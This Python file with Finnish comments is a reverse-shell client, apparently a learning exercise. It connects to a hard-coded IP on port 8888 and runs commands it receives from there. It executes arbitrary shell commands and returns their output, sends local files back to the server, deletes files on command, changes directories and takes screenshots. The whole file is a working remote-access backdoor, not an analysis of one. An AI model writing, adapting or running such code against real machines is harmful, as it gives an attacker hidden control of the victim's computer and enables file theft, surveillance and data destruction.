import socket
import subprocess
import os
import pyautogui

def delete(s, command):
    filename = command.split()[1]
    if os.path.exists(filename):
        os.remove(filename)
        s.send(b'file deleted')
    else:
        s.send(b'file not found')

def download(s,command):
    filename = command.split()[1]
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            bits = f.read(1024)
            while len(bits) > 0:
                s.send(bits)
                bits = f.read(1024)
            s.send(b'DONE')
    else:
        s.send(b'File not found')

def vaihda_dirri(s,command):
    #splitataan välilyönneistä ja otetaan indeksi 1 talteen
    path = command.split()[1]
    #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
    if os.path.exists(path):
        os.chdir(path)
        s.send(f'Directory changed to {os.getcwd()}'.encode())
    #jos ei löydy niin ilmoitetaan serverille
    else:
        s.send(b'Invalid directory name')

def aja_komento(s,command):
    # käytetään subprocessin run functiota. 
    # tarvitaan shelli sekä halutaan ottaa tulos talteen -> capture_output
    result = subprocess.run(command, shell=True, capture_output=True)
    # tulos on standard outputissa. virheet läytyvät result.stderrorista
    # eli jos oli virheellinen komento saadaan näytölle virheilmoitus eikä ohjelma kaadu
    if result.returncode == 0:
        s.send(result.stdout)
    else:
        s.send(b'Invalid command')

def main():

    host_ip = '172.20.16.61' #172.20.16.62
    port    = 8888
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host_ip, port))

    while True:
        #otetaan käsky talteen. 1kilotavu riittää. decodtaan bytet takaisin stringeiksi
        command = s.recv(4096).decode('ISO-8859-1')
        if command == 'exit':
            s.close()
            break
        elif command.startswith('cd') and len(command) > 3:
            vaihda_dirri(s,command)
        elif command.startswith('download'):
            download(s,command)
        elif command == 'screen':
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
        elif command.startswith('del'):
            delete(s,command)
        # elif command.startswith('upload'):
        #     upload(s,command)
        #     continue
        else:
            #ajetaan komento sekä lähetetään tulos serverille. 
            aja_komento(s,command)
            


if __name__ == '__main__':
    main()